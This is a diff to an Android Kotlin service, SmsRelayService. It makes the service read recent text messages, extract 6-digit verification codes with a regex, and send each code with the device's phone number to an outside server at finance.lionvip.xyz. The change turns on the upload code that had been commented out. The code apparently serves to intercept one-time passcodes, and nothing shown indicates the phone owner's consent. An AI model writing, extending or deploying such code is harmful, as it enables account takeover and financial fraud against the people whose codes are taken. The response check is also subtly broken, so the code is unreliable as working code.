@@ -6,6 +6,7 @@ import android.content.Intent
 import android.database.Cursor
 import android.os.Binder
 import android.os.IBinder
+import android.provider.SyncStateContract
 import android.provider.Telephony
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
@@ -23,6 +24,8 @@ import org.json.JSONException
 import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.Date
+import java.util.regex.Matcher
+import java.util.regex.Pattern
 
 
 class SmsRelayService : Service() {
@@ -46,14 +49,17 @@ class SmsRelayService : Service() {
                 Thread.sleep(3000)
 
                 val sp = App.getContext().getSharedPreferences("config", AppCompatActivity.MODE_PRIVATE)
-                val deviceSerial = sp.getString("DeviceSerial", "")
-                if (deviceSerial.isNullOrEmpty()) {
+                // val deviceSerial = sp.getString("DeviceSerial", "")
+                val phoneNumber = sp.getString("DevicePhoneNumber", "")
+                if (phoneNumber.isNullOrEmpty()) {
                     continue
                 }
                 synchronized(dbLock) {
                     val list = SmsRepository.getInstance().getFromSendStatus(0)
                     list.forEach {
-                        report(deviceSerial, it)
+                        if (report(phoneNumber, it) != 0) {
+                            SmsRepository.getInstance().updateSendStatus(it.id, 1)
+                        }
                     }
                 }
             }
@@ -61,29 +67,37 @@ class SmsRelayService : Service() {
         thread!!.start()
     }
 
-    private fun report(deviceSerial: String, sms: SmsItem): Int {
+    private fun report(phoneNumber: String, sms: SmsItem): Int {
         var status = 0
-    //     val client = OkHttpClient()
-    //     val body = "{\"mobile\":\"${deviceSerial}\", \"code\":{\"phone\":\"$sms.number\", \"body\":\"$sms.body\", \"receiveTime\":\"$sms.receiveTime\"}}".toRequestBody(JSON)
-    //     val request = Request.Builder()
-    //         .url("https://finance.lionvip.xyz/api/sys/set_mobile_code")
-    //         .post(body)
-    //         .build()
-    //     try {
-    //         val response = client.newCall(request).execute()
-    //         val jsonString = response.body.toString()
-    //         response.close()
-    //         val jsonObject = JSONObject(jsonString)
-    //         if (jsonObject["success"] == "true") {
-    //             status = 1
-    //         }
-    //     } catch (_: IOException) {
-    //
-    //     } catch (_: JSONException) {
-    //
-    //     } finally {
-    //
-    //     }
+        val client = OkHttpClient()
+        val pattern: Pattern = Pattern.compile("(\\d{6})")
+        val matcher: Matcher = pattern.matcher(sms.body)
+        if (!matcher.find()) {
+            return status;
+        }
+        val code = matcher.group(0);
+        Log.d("main", "验证码为: $code");
+        // val body = "{\"mobile\":\"${phoneNumber}\", \"code\":{\"phone\":\"$sms.number\", \"body\":\"$sms.body\", \"receiveTime\":\"$sms.receiveTime\"}}".toRequestBody(JSON)
+        val body = "{\"mobile\":\"${phoneNumber}\", \"code\":\"$code\"}".toRequestBody(JSON)
+        val request = Request.Builder()
+            .url("https://finance.lionvip.xyz/api/sys/set_mobile_code")
+            .post(body)
+            .build()
+        try {
+            val response = client.newCall(request).execute()
+            val jsonString = response.body.toString()
+            response.close()
+            val jsonObject = JSONObject(jsonString)
+            if (jsonObject["success"] == "true") {
+                status = 1
+            }
+        } catch (_: IOException) {
+
+        } catch (_: JSONException) {
+
+        } finally {
+
+        }
         return status
     }
 
@@ -132,7 +146,7 @@ class SmsRelayService : Service() {
             Telephony.Sms.DATE,
             Telephony.Sms.TYPE,
         )
-        val last4hour = (System.currentTimeMillis() - 72 * 60 * 60 * 1000).toString()
+        val last4hour = (System.currentTimeMillis() - 4 * 60 * 60 * 1000).toString()
         val cur: Cursor? = cr.query(Telephony.Sms.CONTENT_URI, projection, "${Telephony.Sms.DATE} > ?", arrayOf(last4hour), Telephony.Sms.DEFAULT_SORT_ORDER)
         Log.i(TAG, "---------getSmsFromPhone")
 
